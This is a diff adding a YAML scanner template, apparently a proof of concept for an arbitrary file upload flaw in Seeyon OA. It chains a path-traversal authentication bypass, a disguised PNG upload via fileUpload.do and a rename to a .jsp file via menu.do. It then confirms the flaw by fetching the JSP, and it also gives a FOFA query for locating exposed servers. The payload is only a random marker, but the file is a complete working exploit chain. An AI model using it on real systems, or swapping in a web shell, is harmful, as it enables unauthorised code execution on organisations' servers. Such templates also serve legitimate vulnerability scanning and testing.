@@ -1,0 +1,84 @@
+id: poc-yaml-seeyon-fileUpload-do-anyfile-upload
+info:
+  name: 致远互联OA fileUpload.do 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 致远互联-OA
+  fofa: title="协同管理软件 V5.6SP1"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload
+  headers:
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+  data: '--00content0boundary00
+
+    Content-Disposition: form-data; name="type"
+
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="extensions"
+
+
+    png
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="applicationCategory"
+
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="destDirectory"
+
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="destFilename"
+
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="maxSize"
+
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="isEncrypt"
+
+
+    false
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="file1"; filename="1.png"
+
+    Content-Type: Content-Type: application/pdf
+
+
+    {{.t2}}
+
+    --00content0boundary00--'
+  expression: status_code == 200 && contains(body,"fileurls")
+  output:
+  - regex_match(body,"(?P<id>-?[0-9]{16,20})")
+- method: POST
+  path: /seeyon/autoinstall.do/../../seeyon/privilege/menu.do
+  headers:
+    Content-type: application/x-www-form-urlencoded
+  data: method=uploadMenuIcon&fileid={{.id}}&filename={{.t1}}.jsp
+  expression: status_code == 200
+- method: GET
+  path: /seeyon/main/menuIcon/{{.t1}}.jsp
+  expression: status_code == 200 && contains(body,t2)
+transport: http
